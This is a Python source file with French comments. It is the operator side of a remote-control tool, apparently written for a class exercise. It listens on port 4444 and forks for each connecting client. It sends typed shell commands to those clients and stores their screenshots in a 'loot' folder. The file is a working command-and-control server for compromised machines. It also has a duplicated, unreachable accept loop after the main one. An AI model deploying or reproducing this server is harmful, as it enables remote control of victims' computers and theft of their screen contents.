import socket
import os
import sys

# On definit l'adresse et le port
HOST = "0.0.0.0"
PORT = 4444

def gerer_client(conn, addr):
    print(f"[+] Nouvelle connexion depuis {addr}")
    
    while True:
        try:
           
            cmd = input(f"{addr} > ")
            
            if cmd == "exit":
                conn.send(b"exit")
                break
                
            # On envoie la commande au client
                        # On envoie la commande au client
            conn.send(cmd.encode("utf-8"))
            
            # --- NOUVEAU : Si on demande une capture d'ecran ---
            if cmd == "screenshot":
                # On recoit les donnees brutes (binaire), pas du texte
                # 1 Mo max pour une image c'est suffisant pour le TP
                data = conn.recv(1024 * 1024) 
                
                if data:
                    # On cree un nom de fichier unique base sur l'IP du client
                    nom_fichier = f"loot/screen_{addr[0]}.png"
                    
                    # On ouvre en mode binaire ('wb' pour write binary)
                    with open(nom_fichier, "wb") as f:
                        f.write(data)
                    print(f"[+] Capture d'ecran sauvegardee dans {nom_fichier}")
                else:
                    print("[-] Erreur : aucune donnee recue pour la capture.")
            else:
                # Comportement normal (texte)
                reponse = conn.recv(4096).decode("utf-8")
                
                if not reponse:
                    print("[-] Le client a ferme la connexion.")
                    break
                    
                print(reponse)
            
        except Exception as e:
            print(f"[-] Erreur avec le client : {e}")
            break

    conn.close()
    sys.exit(0) # Tue le processus enfant proprement

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Evite l'erreur 
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] Serveur en ecoute sur le port {PORT}...")
    except Exception as e:
        print(f"[-] Impossible de demarrer : {e}")
        sys.exit(1)

    try:
        # Boucle principale
        while True:
            conn, addr = server.accept()
            
            # Fork pour gérer plusieurs clients en parallèle
            pid = os.fork()
            
            if pid == 0:
                # Processus enfant : gère le client
                server.close()
                gerer_client(conn, addr)
            else:
                # Processus parent : continue d'écouter
                conn.close()
                print(f"[*] Processus fils cree (PID: {pid})")
                
    except KeyboardInterrupt:
        # Permet de fermer le serveur proprement avec Ctrl+C
        print("\n[-] Arret du serveur...")
        server.close()
        sys.exit(0)    



    # Boucle principale
    while True:
        conn, addr = server.accept()
        
        # Création d'un processus enfant pour isoler la gestion du client
        pid = os.fork()
        
        if pid == 0:
            # Processus enfant : gère le client
            server.close()
            gerer_client(conn, addr)
        else:
            # Processus parent : continue d'écouter
            conn.close()
            print(f"[*] Processus fils cree (PID: {pid})")

if __name__ == "__main__":
    main()